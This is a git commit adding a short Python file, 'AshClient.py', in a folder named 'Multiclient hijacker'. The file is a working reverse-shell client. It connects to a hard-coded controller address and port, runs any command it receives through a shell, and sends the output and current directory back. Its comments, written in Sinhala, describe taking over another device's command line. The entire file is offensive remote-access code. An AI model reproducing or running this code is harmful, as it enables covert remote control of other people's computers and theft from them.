44fde89f8b0b6249139d0d9cd4200cbba8eb786a
Ashen dulmina@ <84361256+Ashendulmina@users.noreply.github.com>
2022-09-19 15:55:28 +0530

    Add files via upload

---
+++ Multiclient hijacker/AshClient.py
@@ -0,0 +1,27 @@
+import socket
+import os
+import subprocess
+
+#one port ekak danna one
+#me divide eka host karanawaone 
+s = socket.socket()
+host = '192.168.1.9'
+port = 9999
+
+s.connect((host, port))
+
+#anith divice ekek cmd eka access gannawa
+
+while True:
+    data = s.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = cmd.stdout.read() + cmd.stderr.read()
+        output_str = str(output_byte,"utf-8")
+        currentWD = os.getcwd() + "> "
+        s.send(str.encode(output_str + currentWD))
+
+        print(output_str)
